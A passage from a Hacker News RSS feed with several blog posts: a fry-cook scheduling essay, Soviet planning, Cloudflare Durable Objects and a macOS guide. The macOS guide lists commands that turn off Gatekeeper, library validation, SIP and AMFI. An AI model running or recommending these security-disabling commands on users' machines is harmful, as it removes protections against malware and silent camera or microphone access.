<p>You can also find more information on <a href="https://webdevetc.com/programming-tricks/typescript/webpack/guide-to-typescript-config-for-webpack/">setting up Typescript with Webpack here</a>.</p>
</div></div>]]>
            </description>
            <link>https://webdevetc.com/blog/vue-3-guide-with-example-code-snippets/#using-typescript-in-vue-3</link>
            <guid isPermaLink="false">hacker-news-small-sites-25084928</guid>
            <pubDate>Fri, 13 Nov 2020 17:34:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Double fetches, scheduling algorithms, and onion rings]]>
            </title>
            <description>
<![CDATA[
Score 40 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25084909">thread link</a>) | @markmossberg
<br/>
November 13, 2020 | https://offlinemark.com/2020/11/12/double-fetches-scheduling-algorithms-onion-rings/ | <a href="https://web.archive.org/web/*/https://offlinemark.com/2020/11/12/double-fetches-scheduling-algorithms-onion-rings/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>Most people thought I was crazy for doing this, but I spent the last few months of my gap year working as a short order cook at a family-owned fast-food restaurant. (More on this <a href="https://offlinemark.com/2020/11/12/gap-year-restaurant/">here</a>.) I’m a programmer by trade, so I enjoyed thinking about the restaurant’s systems from a programmer’s point of view. Here’s some thoughts about two such systems.</p>



<h2>Double, triple, and even quadruple fetching</h2>



<p>Human systems, at first glance, can appear broken, but due to subtle human factors, they might actually work just fine.</p>



<p>My best example is the system for taking and fulfilling orders. We never wrote anything down, and would re-ask orders multiples times, including when ringing customers up. (In computer security, this is known as a <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/double-fetch/">double fetch</a>.) Not great service and can theoretically let customers lie and pay less. </p>



<p>In practice most customers didn’t mind <em>too</em> much, liars are rare, and we can loosely detect when something seems off with an order.</p>



<p>Writing orders down and asking strictly once seems optimal but has subtle flaws. For one thing, there’s not enough space behind the counter for everyone to walk to the written order, so it requires more internal communication. This will fail during a rush when you’re blocked on order details and coworkers are too busy for questions. <strong>Customers are always idle; coworkers aren’t</strong>.</p>



<p>It can increase confusion if order slips aren’t thrown out when orders are finished and is also logistically (and literally) messy if you have greasy gloves and want to avoid touching a pen, then food. Lastly, many of my coworkers were older and very used to the existing system. <strong>A major transition to a new system would have generated more confusion than it’s worth</strong>.</p>



<h2>Scheduling algorithms for the fry cook</h2>



<p>While I covered a range of duties including the cash register, milkshake machine, and grill, I spent the most time on the deep fryer. I’m delighted to present this overanalysis of life as a fry cook, from a programmer’s point of view.</p>



<p>This is what deep fryers look like (<a href="https://www.google.com/url?sa=i&amp;url=https%3A%2F%2Fwww.nachi.org%2Fdeep-fryer-inspection.htm&amp;psig=AOvVaw1D90dsceyn1wmU-KOGAEuy&amp;ust=1605391502547000&amp;source=images&amp;cd=vfe&amp;ved=0CAIQjRxqFwoTCNCq-sPDgO0CFQAAAAAdAAAAABAE">source</a>):</p>



<div><figure><img loading="lazy" src="https://i0.wp.com/d12m281ylf13f0.cloudfront.net/images10-2/commercial-fryer-2.jpg?resize=360%2C352&amp;ssl=1" alt="Deep Fryer" width="360" height="352" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/d12m281ylf13f0.cloudfront.net/images10-2/commercial-fryer-2.jpg?resize=360%2C352&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<p>This picture has 2 fryers, each with 2 baskets that can be submerged to sit in the vats of hot oil below. At work, only 1 fryer would be active on any given day which effectively allows 2 items to be fried at the same time.</p>



<p><strong>Fry cooks have a lot in common with operating systems in that they are both responsible for scheduling</strong>. Operating systems schedule threads to run on a limited number of cores; fry cooks schedule food to be fried in a limited number of fryers. Different food items have different priorities, and different lengths of time to cook.</p>



<p>French fries, curly fries, and onion rings (collectively, “fries”) are the main menu items from the deep fryer. Each fry order could be large or small (except for rings which were only large) and eat-in or to-go. The job of the fry cook is to:</p>



<ul><li>Accept fry orders from the greeter.</li><li>Allocate portions of fries from the big bags of raw fries</li><li>Cook them in the fryers</li><li>Put them into the appropriate eat-in/to-go container</li><li>Serve them onto the customer’s tray on the counter, or their to-go bag</li></ul>



<p>The goal is to do this with maximum speed and accuracy and without dropping orders. You’ll ideally minimize the number of times you ask customers and coworkers for order details. In addition, there are a few sources of complexity to handle:</p>



<ul><li><strong>Incomplete information</strong>: Depending on the greeter, they may forget to specify if it’s eat-in or to-go. You can always ask the customer, but the grill chef will likely ask the same question in a little bit. You might be able to save a customer ask if you can eavesdrop on that interaction.</li><li><strong>Timing requirements</strong>: You need to finish orders by the time the grill chef finishes the burgers/hot dogs, but you shouldn’t finish too early. If you put the fries on the counter way before the burgers are ready, they’ll get cold. This matters less for to-go orders, which you can serve into the bag immediately.</li><li><strong>Scale</strong>: During a rush, you might receive many orders per minute, while only being able to process 1-2 per minute. Once the greeter relays the order, they forget it, so it’s up to you to remember. And remember: no writing things down.</li><li><span><strong>Waste avoidance</strong>: </span>Sometimes you or another cook will make too many fries. To avoid wasting them, you can use the excess towards a future order by refreshing them with a splash later and adding them to a fresh batch.</li><li><strong>Changing orders</strong>: Customers sometimes change their order after you’ve started cooking (e.g. regular fry to curly fry). Now you have to figure out what to do with the partially cooked portion currently in the fryer.</li><li><strong>Miscellaneous items</strong>: In addition to fries, there other items that need to be scheduled for time in the fryer, including chicken patties, bacon, clam strips, and fish fillets. </li></ul>



<p>A few techniques to manage all this:</p>



<ul><li><strong>Batching orders together</strong>. If a large and small fry order are in the queue, you can cook them in the same basket at the same time.<ul><li>Some customers request their fries “well done”, meaning cooked extra long. This makes batching more complicated.</li></ul></li><li><strong>“Wait n Splash”</strong>: If a fry order is done cooking far before the rest of the grill items and you don’t have pressing items that need fryer time, you can raise the basket from the oil, but leave the food in it. When the grill items finish, you can quickly splash the food back in the oil to refresh it, then serve it. This will prevent it from getting cold on the counter.</li><li><strong>Inactive fryer baskets</strong>: It can be handy to have extra storage space for cooked food. If you have a “wait n splash” order waiting, but you have more orders to fry, you can use the 2 spare baskets from the inactive fryer to store the waiting order and free up the fryer slot. This is also useful when customers change their order and you need to quickly stash the half cooked portion somewhere and start the adjusted order.</li><li><strong>“The tong dip”</strong>: If both fryers are in use and the grill chef hands you bacon to be urgently cooked, you can hold the bacon in tongs and dip it into one of the submerged baskets. This lets you effectively cook more than 2 things at the same time.</li></ul>



<p>Here’s the system I ended up using. When a new order came in, I’d stop whatever I was doing and grab the appropriate container and place it in the corresponding fry bucket. This captures all 3 pieces of information about the order (fry type, size, to-go?) letting me forget it. If I strictly follow this, I can just process the containers in the buckets like a queue. However, I still need to keep a sense of order memorized because the system doesn’t capture global ordering – if I have containers in the fry, curly fry, and onion ring buckets, I can’t tell which order came in first.</p>



<p>I don’t have a solution for this. On a super busy day, this system falls apart and I drop orders. Extreme load like that has only happened a few times and in that case, I just make large batches, forget about syncing up with the grill items, and hope I don’t have too much excess at the end. Generally, the system worked nicely.</p>



<h2>Conclusion</h2>



<p>It’s fun to think about human systems, like those in a restaurant, from a programmer’s point of view. A fry cook’s job closely resembles that of an operating system scheduler, complete with optimization points and edge cases. One can try to optimize human systems as if they were computer systems, but it’s critical to understand the subtle human aspects of the system when evaluating improvements.</p>



<div><div>
<div><div>
<div><div>
<hr>



<h3>Learn something new? Let me know!</h3>



<p>Did you learn something from this post? I’d love to hear what it was — tweet me <a href="https://twitter.com/offlinemark">@offlinemark</a>! </p>



<p>I also have a mailing list if you want to know when I write new posts:</p>






<hr>
</div></div>
</div></div>
</div></div>
					</div></div>]]>
            </description>
            <link>https://offlinemark.com/2020/11/12/double-fetches-scheduling-algorithms-onion-rings/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25084909</guid>
            <pubDate>Fri, 13 Nov 2020 17:33:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Optimizing Things in the USSR (2016)]]>
            </title>
            <description>
<![CDATA[
Score 131 | Comments 186 (<a href="https://news.ycombinator.com/item?id=25084479">thread link</a>) | @amai
<br/>
November 13, 2020 | https://chris-said.io/2016/05/11/optimizing-things-in-the-ussr/ | <a href="https://web.archive.org/web/*/https://chris-said.io/2016/05/11/optimizing-things-in-the-ussr/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
  
  <p><span>11 May 2016</span></p><meta charset="utf-8">



<p>As a data scientist, a big part of my job involves picking metrics to optimize and thinking about how to do things as efficiently as possible. With these types of questions on my mind, I recently discovered a totally fascinating book about about economic problems in the USSR and the team of data-driven economists and computer scientists who wanted to solve them. The book is called <a href="http://www.amazon.com/Red-Plenty-Francis-Spufford/dp/1555976042"><em>Red Plenty</em></a>. It’s actually written as a novel, weirdly, but it nevertheless presents an accurate economic history of the USSR. It draws heavily on an earlier book from 1973 called <a href="http://www.amazon.com/Planning-Problems-USSR-Contribution-Mathematical/dp/0521202493"><em>Planning Problems in the USSR</em></a>, which I also picked up. As I read these books, I couldn’t help but notice some parallels with planning in any modern organization. In what will be familiar to any data scientist today, the second book even includes a quote from a researcher who complained that 90% of his time was spent cleaning the data, and only 10% of his time was spent doing actual modeling!</p>

<p>Beyond all the interesting parallels to modern data science and operations research, these books helped me understand a lot of interesting things I previously knew very little about, such as linear programming, price equilibria, and Soviet history. This blog post is about I learned.</p>

<h4>Balance sheets and manual calculation: Kind of a trainwreck</h4>

<p>The main task in the centrally planned Soviet economy was to allocate resources so that a desired assortment of goods and services was produced. Every year, certain target outputs for each good were established. Armed with estimates of the available input resources, central administrators used balance sheets to set plans for every factory, specifying exactly how much input commodities each factory would receive, and how much output it should produce. Up through the 1960s, this was always done by manual calculation. Since there were hundreds of thousands of commodities, and since the supply chains had many dependency steps, it was impossible to compute the full balance sheets for the economy. The administrators therefore decided to make some simplifying assumptions. As a result of these these simplifying assumptions, resource allocation became a bit of a trainwreck. Below are a few of the simplifications and their consequences.</p>

<ul>
  <li><strong>Dimensionality reduction by removing variables.</strong> Because there were too many commodities to track, administrators often limited their analysis to the 10,000 most important commodities in the economy. But when the production of those commodities were planned, there was often a hidden shortage of commodities whose output was not planned centrally but which were used as inputs to one of the 10,000 planned products. Factories that depended on those commodities often sat idle for months as they waited for the shortages to end.</li>
  <li><strong>Dimensionality reduction by aggregation.</strong> Apparently, steel tubes can come in thousands of different types. They can come in different lengths, different shapes, and different compositions. To reduce the dimensionality of the problem, administrators would often track the total tonnage of a few broad classes of steel tubes in the models, rather than using a more detailed classification scheme. While their models successfully balanced the tonnage of tubes for the broad categories (the output in tons of tube-producing factories matched the input requirements in tons of tube-consuming factories), there were constant surpluses of some specific types of tubes, and shortages of other specific types of tubes.&nbsp;In particular, since tonnage was used as a metric, tube-producing factories were overly incentivized to make easy-to-produce thick tubes. As a result, thin tubes were always in short supply.</li>
  <li><strong>Propagating adjustments only a few degrees back.</strong> Let’s say that during balance calculations, the administrators realized they needed to bump up the target output of one commodity. If they did that, it was also necessary to bump up the output targets of commodities that were input into the target commodity. But if they did <em>that</em>, they also needed to bump up the output targets of commodities that fed into those commodities, and so on! This involved a crazy amount of extra hand calculations every time they needed make an adjustment. To simplify things, the administrators typically made adjustments to the first-order suppliers, without making the necessary adjustments to the suppliers of the suppliers. This of course led to critical shortages of input commodities, which again led to idle factories.</li>
</ul>

<!-- The tooltip has absolute positioning, which means it is positioned
"relative" to any parent it has who has either absolute or relative positioning.
The #econ_scatter parent would by default be static, so I have to change it to
relative -->
<div>
  
  
  <p><strong>Figure 1.</strong> Some example inputs and outputs in the Soviet economy in 1951, described in units of weight. This summary shows an extreme dimensionality reduction, more extreme than was ever used in planning. In this diagram, most commodities are excluded and each displayed commodity collapses across multiple different product types. Multiple steps in the supply chain are collapsed into a single step. (Source: <a href="http://www.foia.cia.gov/sites/default/files/document_conversions/89801/DOC_0000380738.pdf">CIA</a>)</p>
</div>

<p><br>Even if the administrators could get the accounting correct, which they couldn’t, their attempts to allocate resources would still be far from optimal. In the steel industry, for example, some factories were better at producing some types of tubes whereas others were better at producing other types of tubes. Since there were thousands of different factories and tube types, it was non-trivial to decide how to best distribute resources and output requirements, and it was not immediately obvious which factories should be expanded and which should be closed down.</p>

<h4>Supply chain optimizations</h4>

<p>In the late 1960’s, a group of economists and computer scientists known as the “optimal planners” began to push for a better way of doing things. The group argued that a technique called <a href="https://www.math.ucla.edu/~tom/LP.pdf">linear programming</a>, invented by <a href="https://en.wikipedia.org/wiki/Leonid_Kantorovich">Leonid Kantorovich</a>, could optimally solve the problems with the supply chain. At a minimum, since the process could be computerized, it would be possible to perform more detailed calculations than could be done by hand, with less dimensionality reduction. But more importantly, linear programming allowed you to optimize arbitrary objective functions given certain constraints. In the case of the supply chain, it showed you how to efficiently allocate resources, identifying efficient factories that should get more input commodities, and inefficient factories that should be shut down.</p>

<div>
  <p><img src="https://chris-said.io/assets/kantorovich.jpg" height="300"></p>
  <p><strong>Figure 2.</strong> Leonid Kantorovich, inventor of linear programming and winner of the 1975 Nobel Prize in Economics.</p>
</div>

<p><br>The optimal planners had some success here. For example, in the steel industry, about 60,000 consumers requested 10,000 different types of products from 500 producers. The producers were not equally efficient in their production. Some producers were efficient for some types of steel products, but less efficient for other types of steel products. Given the total amount of each product requested, and given the constraints of how much each factory can produce, the goal was decide how much each factory should produce of each type of product. If we simplify the problem by just asking how much each factory should produce without considering how the products will be distributed to the consuming factories, this becomes a straightforward application of the <a href="https://www.math.ucla.edu/~tom/LP.pdf">Optimal Assignment Problem</a>, a well-studied example in linear programming. If we additionally want to optimize distribution, taking into account the distance-dependent costs of shipments from one factory to another, the problem becomes more complicated but is still doable. The problem becomes similar to the <a href="https://www.math.ucla.edu/~tom/LP.pdf">Transportation Problem</a>, another well-studied example in linear programming, but in this case generalized to multiple commodities instead of just one.</p>

<p><img src="https://chris-said.io/assets/steel_tubes.jpg" height="200"></p>

<p>By introducing linear programming, the optimal planners were modestly successful at improving the efficiency of some industries, but their effect was limited. First, political considerations prevented many of the recommendations surfaced by the model from being implemented. Cement factories that were known to be too inefficient or too far away from consumers were allowed to remain open even though the optimal solution recommended that they be closed. Second, since the planners were only allowed to work in certain narrow parts of the economy, they never had an opportunity to propagate their recommendations back in the supply chain, although one could imagine extending the models to do so. Third, and perhaps most importantly, the value of each commodity was set by old-school administrators in an unprincipled way, and so the optimal planners were forced to optimize objective functions that didn’t even make sense.</p>

<h4>Ideas about optimizing the entire economy</h4>

<p>While the optimal planners were able to improve the efficiency of a few industries, they had more ambitious plans. They believed they could use linear programming to optimize the entire economy and outperform capitalist societies. Doing so involved more than just scaling out the supply chain optimizations adopted by certain industries. It involved shadow prices and interest rates, and a few other things I’ll admit I don’t totally understand. But while I don’t really understand the implementation, I feel like the broader goal of the planners is easier to understand and explain:</p>

<p>Basically, in a completely free market, at least under <a href="https://en.wikipedia.org/wiki/Arrow%E2%80%93Debreu_model">certain assumptions</a>, prices are supposed to converge to what’s called a General Equilibrium. The equilibrium prices have a some nice properties. They balance aggregate supply and demand, so that no commodities are in shortage or surplus. They are also <a href="https://en.wikipedia.org/wiki/Pareto_efficiency">Pareto efficient</a>, which means that nobody in the economy can be made better off without making someone else worse off.</p>

<p>The optimal planners thought that they could do better. In particular, they pointed to two problems with capitalism: First, prices in a capitalist society were determined by individual agents using trial and error to guess the best price. Surely these agents, who had imperfect information, were not picking the exactly optimal prices. In …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://chris-said.io/2016/05/11/optimizing-things-in-the-ussr/">https://chris-said.io/2016/05/11/optimizing-things-in-the-ussr/</a></em></p>]]>
            </description>
            <link>https://chris-said.io/2016/05/11/optimizing-things-in-the-ussr/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25084479</guid>
            <pubDate>Fri, 13 Nov 2020 17:10:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Durable Objects in Production]]>
            </title>
            <description>
<![CDATA[
Score 130 | Comments 56 (<a href="https://news.ycombinator.com/item?id=25084470">thread link</a>) | @geelen
<br/>
November 13, 2020 | https://linc.sh/blog/durable-objects-in-production | <a href="https://web.archive.org/web/*/https://linc.sh/blog/durable-objects-in-production">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>A few weeks ago, Cloudflare announced Durable Objects: a <a href="https://blog.cloudflare.com/introducing-workers-durable-objects/">"truly serverless approach to storage and state"</a>, which piqued our interest here at <a href="https://linc.sh/">Linc</a>. We're already big proponents of Cloudflare Workers (Workers is our <a href="https://linc.sh/why-cloudflare">recommended deploy target</a>, after all), so we're always interested in what new capabilities that platform is getting. But it was this section that sounded <em>ideal</em> for solving a particularly annoying UX problem with much less code/infrastructure than we'd assumed we would need (see the <a href="#building-this-without-durable-objects">comparison section</a> at the end).</p><blockquote><em>Historically ... there was no way to control which instance received a request, [so] there was no way to force two clients to talk to the same Worker... Durable Objects change that: </em><strong><em>requests related to the same topic can be forwarded to the same object, which can then coordinate between them, without any need to touch storage</em></strong><em>.</em></blockquote><p>This is a big deal. And, after a few days tinkering, we've been able to successfully deploy our solution to production! In this post we'll talk about the problem we solved, how Durable Objects work, we'll go through the code and what it's like working with them, and then look at just how much work it saved us.</p><blockquote><strong><em>Note:</em></strong><em> Durable Objects are in </em><a href="http://www.cloudflare.com/cloudflare-workers-durable-objects-beta"><em>limited beta</em></a><em>, and "not recommended for production use" (yet). However, our use-case doesn't push any of the </em><a href="https://developers.cloudflare.com/workers/learning/using-durable-objects#limitations-during-the-beta"><em>beta limits</em></a><em> and we're using it to </em><a href="#the-client"><em>progressively enhance</em></a><em> our existing solution, so we've felt safe </em><a href="#demo"><em>deploying it</em></a><em> to production already!</em></blockquote><h2>The problem—streaming build logs</h2><p>While Linc is a product focussed on automating deployments and previewing each commit, a big part of the day-to-day usage is building commits from source into a <a href="https://fab.dev/">FAB</a>, and viewing the logs of that process is a core piece of the product:</p><figure><p><img src="https://uploads-ssl.webflow.com/5d4b7c4a71ecaf63b7b03f8a/5fad68c90ccf85995706ac8a_98383039-e31a9580-2043-11eb-89ee-ca0fd3a9481a.png" alt="image"></p></figure><p>When you're first getting set up, or when something changes in your build or goes awry, you can find yourself poring over these logs to find and fix your issue. And so being able to watch them "live", as they're being built, is a useful tool in reducing your feedback loop (and of course Linc is big on <a href="https://linc.sh/blog/bottleneck">reducing feedback loops</a>!). But that turns out to be an annoyingly difficult feature to implement.</p><p>For starters, most of the time a build will start before any clients are watching (but not always e.g. when restarting a build after a config change). In this case, you need to accumulate a partial build log <em>somewhere</em> so it's ready to send it to the first client to connect. And multiple clients might be watching the same build, and disconnect/reconnect at any moment, too. It's not intractable, but it's just complex enough to be tricky.</p><h3>Our current compromise: reuse our existing GraphQL subscriptions</h3><p>Until now, we've taken a pragmatic approach: use GraphQL subscriptions to periodically flush the entire `Build` record, logs included, every few seconds. This actually reuses our existing live-update infrastructure that powers almost every view in the app:</p><figure><p><img src="https://uploads-ssl.webflow.com/5d4b7c4a71ecaf63b7b03f8a/5fae92591d7dddb3a6e3cd2c_Current%20Implementation.png" loading="lazy" alt=""></p></figure><p>So while updates are triggered from DB events, using a GraphQL subscription server in this way gives us an important guarantee: <strong>the clients are <em>always</em> getting the full snapshot of the data that they're interested in</strong>. In other words, <em>any</em> change to a record in the DB results in the client getting a full update of any affected queries from the server—there's no need to manage or merge updates on the client, it can simply replace its local cache with the latest update. It makes a fully live UI <em>much</em> easier to implement, at the expense of some redundant data transfer.</p><p>As a general pattern, it's worked fantastically for us. But to send each log of a current build line-by-line it's way way <em>way</em> too heavy. Not just in terms of sending way more data than necessary, but we'd be absolutely thrashing our Dynamo table &nbsp;<em>even if nobody's watching the logs currently</em>. So, we've taken a compromise: use the existing infrastructure and flush the logs to the DB every ~10 seconds. Most builds take between 2 and 4 minutes so it's only a handful of extra writes, and it feels OK for a stop-gap. We've had an open ticket to build out a dedicated log-streaming solution but the <a href="#building-this-without-durable-objects">amount of additional infrastructure</a> put us off. That is until Durable Objects came along...</p><h2>What are Durable Objects?</h2><blockquote><em>Note: it's worth reading the </em><a href="https://blog.cloudflare.com/introducing-workers-durable-objects/"><em>introductory blog post</em></a><em> to get a background, but this is my best attempt at a TL;DR:</em></blockquote><p>Durable Objects are a way of defining a serverless function as an <strong>instance of a JS class</strong>. They can't be reached by external HTTP requests directly, instead a "normal" (i.e. stateless) Worker creates/accesses instances using their <strong><em>namespace</em></strong> (usually the name of their class) and an <strong><em>id</em></strong>. For a given <strong><em>namespace</em></strong> &amp; <strong><em>id</em></strong>, there will be <strong>exactly one</strong> instance, somewhere in the world, and it can store data. Instances communicate with workers over normal HTTP requests/responses, and support websockets.</p><p>If you find that a bit confusing, you're not alone! I didn't really "get" it until I'd read an example, so I've reproduced and commented our Worker and Object code in <a href="#the-solution">The Solution</a> section below.</p><h3>Durable Objects? "Stateful workers"? "Materialised actors"?</h3><p>I hope it's not terribly controversial, but I'm not a big fan of the name "Durable Objects". It conjures a very data-centric model, where it sounds like a way to... maybe define classes that magically run in the cloud, and where instances... maybe get "frozen" and stored when they go idle? It presents it like a type of database, whereas the reality is much closer to the Worker/Serverless model, just with per-worker storage.</p><p>That said, the phrase "workers with per-worker storage" <em>massively</em> downplays how incredibly transformative this concept is, though, so I get that Cloudflare <em>want</em> it to sound like a "whole new thing". But conceptually, you may be better thinking about these as "materialised <a href="https://en.wikipedia.org/wiki/Actor_model">actors</a>" or, as we've come to coining them internally "stateful workers".</p><p>We'll just call them "Objects" and "instances" in the remainder of this blog post.</p><h3>Instances as a kind of "state"</h3><p>In the documentation, there's a lot of focus on the fact that an Object has its own key-value storage using `controller.storage`. But that API is available only once you have a live <em>instance</em> of an Object, and getting <em>there</em> is actually a whole type of state in disguise.</p><p>The key phrase is <a href="https://blog.cloudflare.com/introducing-workers-durable-objects/#what-is-a-durable-object">here</a>:</p><blockquote><em>Each object has a globally-unique identifier. That object exists in only one location in the whole world at a time. Any Worker running anywhere in the world that knows the object's ID can send messages to it. All those messages end up delivered to the same place.</em></blockquote><p>Combine this with the fact that each Object instance supports websockets, suddenly you can define a system where, as long as two endpoints share some kind of <strong><em>key</em></strong>, they can pass messages directly (kind of the way WebRTC connections are possible when two computers can't talk directly, but can both talk to a <a href="https://en.wikipedia.org/wiki/Traversal_Using_Relays_around_NAT">TURN server</a>). And it turns out, for Linc to stream live build logs to the browser, that's exactly what we need.</p><h2>The solution</h2><p>We already have an ideal shared key: the git SHA of the current commit being built. We actually use the `tree_id` of the commit, not the commit sha, because a `tree_id` is a hash of <em>only the underlying code</em>, not its history or commit message (an aside: this is how Linc can release instantly when you merge an up-to-date PR, without waiting for a new build).</p><p>The solution has 4 components:</p><figure id="w-node-d2c300e41a9b-86b04042"><p><img src="https://uploads-ssl.webflow.com/5d4b7c4a71ecaf63b7b03f8a/5fae92d434933bbb702fde0a_Cloudflare%20Architecture.png" loading="lazy" alt=""></p></figure><ul role="list"><li>The "normal" Cloudflare <strong>Worker</strong> that receives requests from the client/builder and connects them to the appropriate Object instance.</li><li>The Durable <strong>Object</strong> itself, which maintains a list of current clients, a history of logs, and broadcasts new log entries from the builder to each client.</li><li>The <strong>Builder</strong>, which is the machine in our AWS cluster that runs `npm run fab:build` on the source code. It hasn't needed to change very much, but now sends logs to the Worker as well as saving them to Dynamo. We sometimes call this "build server" or just "server" in the code.</li><li>The <strong>Client</strong>, which is our normal React app, that needs to reconcile "live" logs from the Worker with the existing data from GraphQL.</li></ul><h3>The Worker</h3><p>It's fair to say that this is the piece that I was most confused about after reading the <a href="https://developers.cloudflare.com/workers/learning/using-durable-objects">guide</a>. It feels like you should just be able to deploy the Object itself and talk to it directly, but the Worker layer makes a lot of sense once it fits into the bigger picture: it's the only way <strong><em>clients</em></strong> (who talk HTTP to their nearest edge location) can talk to <strong><em>Object instances</em></strong> (which run in exactly one place worldwide). </p><p>The simplest possible Worker would look like this:</p><p>--CODE:language-js--<br>export default {<br> &nbsp;async fetch(request, env) {<br> &nbsp; &nbsp;// Convert our key into a Object ID<br> &nbsp; &nbsp;const id = env.MyObjectNamespace.idFromName('some-fixed-value')<br> &nbsp; &nbsp;// Connect to that instance, booting it if necessary<br> &nbsp; &nbsp;const instance = await env.MyObjectNamespace.get(id)<br> &nbsp; &nbsp;// Forward the current HTTP request to it<br> &nbsp; &nbsp;return instance.fetch(request)<br> &nbsp;}<br>}</p><p>Note that this worker uses a single key for all requests (<em>`'some-fixed-value'`</em>) which means <em>_</em>every<em>_ </em>request would be directed to a <em>_</em>single Object instance<em>_</em>. This is almost certainly not what you want in production, but it was handy when getting started (particularly if you change <em>`'some-fixed-value'` </em>once or twice, so you can be sure you're getting a new instance from the last time you deployed).</p><p>Our Worker isn't actually much more complex, but parses the route to find the <em>`tree_id` </em>to direct all requests for a particular build to a shared instance:</p><div><p>--CODE:language-js--<br>export default {<br> &nbsp;async fetch(request, env) {<br> &nbsp; &nbsp;const { pathname } = new URL(request.url)</p><p> &nbsp; &nbsp;// Pro tip: put the parsing of the route in a static method on the Object so you can use it in both places<br> &nbsp; &nbsp;// (note: the Worker and Object have to be in the same file to share the helper function)<br> &nbsp; &nbsp;const route = DurableBuildLog.toRouteParams(pathname)<br> &nbsp; &nbsp;if (!route.match) return notFound()</p><p> &nbsp; &nbsp;// Validate that the Client has access to this Site's build logs<br> &nbsp; &nbsp;if (route.client) {<br> &nbsp; &nbsp; &nbsp;if (!await clientHasAccess(route.sitename, request.headers)) {<br> &nbsp; &nbsp; &nbsp; &nbsp;return notAuthorized()<br> &nbsp; &nbsp; &nbsp;}<br> &nbsp; &nbsp;}</p><p> &nbsp; &nbsp;// Validate that the Build Server is …</p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://linc.sh/blog/durable-objects-in-production">https://linc.sh/blog/durable-objects-in-production</a></em></p>]]>
            </description>
            <link>https://linc.sh/blog/durable-objects-in-production</link>
            <guid isPermaLink="false">hacker-news-small-sites-25084470</guid>
            <pubDate>Fri, 13 Nov 2020 17:09:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Forbidden Commands to Speed Up macOS]]>
            </title>
            <description>
<![CDATA[
Score 55 | Comments 29 (<a href="https://news.ycombinator.com/item?id=25083934">thread link</a>) | @rubatuga
<br/>
November 13, 2020 | https://www.naut.ca/blog/2020/11/13/forbidden-commands-to-liberate-macos/ | <a href="https://web.archive.org/web/*/https://www.naut.ca/blog/2020/11/13/forbidden-commands-to-liberate-macos/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>November 13, 2020<span> · <a href="https://www.naut.ca/blog/tag/macos/">macos</a> <a href="https://www.naut.ca/blog/tag/software/">software</a> <a href="https://www.naut.ca/blog/tag/diy/">diy</a></span></p></div><div><p><img src="https://www.naut.ca/blog/content/images/2020/11/Screen-Shot-2020-11-13-at-2.02.01-AM.jpg" alt="Screen-Shot-2020-11-13-at-2.02.01-AM"><br>
First, ask yourself, would you like to undo a decade of security protections painstakingly created by Apple, protecting your Mac from malware, spyware, and ransomware? What if these so-called <em>protections</em> prevented the normal and speedy usage of your Mac? See exhibits: [<a href="https://news.ycombinator.com/item?id=25074959">A,</a> <a href="https://news.ycombinator.com/item?id=23273247">B,</a> <a href="https://github.com/microsoft/vscode/issues/105446#issuecomment-722264044">C,</a> <a href="https://github.com/johnboiles/obs-mac-virtualcam/wiki/Compatibility#sip-workaround">D,</a> <a href="https://github.com/MacEnhance/MacForge">E,</a> <a href="https://lapcatsoftware.com/articles/unsigned.html">F</a>]</p>
<p>Is that a yes? <strong>Speed and convenience over security any day!</strong> Let us march on boldly 😃! The steps listed below will give you a short description of each protection we disable, and the necessary command in Terminal.</p>
<h4 id="stepbystepguide">Step-by-step Guide</h4>
<p><strong>Step 1: Disable GateKeeper.</strong> This is the part of macOS that deals with code signature validation. It checks if the app in question was signed by the creator, and then checks whether Apple has given the creator a thumbs-up. macOS 10.15 made this much more stringent, requiring Apple to give <em>each app</em> a thumbs-up.</p>
<pre><code>sudo spctl --master-disable
</code></pre>
<p><strong>Step 2: Disable Library Validation.</strong> This protection checks if an app's libraries are signed by Apple or the creator. Until very recently, macOS apps could load code freely from foreign sources called <em>code libraries</em>. With macOS 10.15, apps are no longer allowed to load libraries that weren't originally packaged with it, unless they explicitly allow it.</p>
<pre><code>sudo defaults write /Library/Preferences/com.apple.security.libraryvalidation.plist DisableLibraryValidation -bool true
</code></pre>
<p><strong>Step 3: Disable System Integrity Protection.</strong> <em>You have to enter Recovery Mode (by holding Command+R while rebooting) in order to disable SIP. This mode lets us change boot data for the Mac.</em> SIP prevents both malware and power-users alike from modifying the system files, core apps, and the kernel of macOS. It does this by only allowing apps and extensions signed by Apple to modify the system.</p>
<pre><code># From the Recovery Mode menubar: Utilities --&gt; Terminal
csrutil disable
</code></pre>
<p><strong>Step 4: Disable Apple Mobile File Integrity.</strong> AMFI is the macOS kernel module that enforces the code-signing validation from Step 1 and the library validation from Step 2. However, even after disabling the services above, AMFI is still checking the signatures of every app that is run, and will cause non-Apple apps to crash when they touch extra-sensitive areas of the system.</p>
<pre><code># While still in Recovery Mode
nvram boot-args="amfi_get_out_of_my_way=1"
</code></pre>
<p><strong>Step 5: Reboot &amp; Enjoy Liberty.</strong> No explanation required.</p>
<h4 id="caveats">Caveats:</h4>
<ul>
<li>If GateKeeper is enabled while AMFI is disabled, some apps will hang while opening.</li>
<li>If AMFI is disabled, prompts to allow apps access to the camera, microphone, accessibility etc. will not be shown. The <code>tccplus</code> utility, found <a href="https://github.com/jslegendre/tccplus">here</a>, alleviates this (there is a GUI script in the repo).</li>
</ul>
<h4 id="furtherreading">Further Reading:</h4>
<ul>
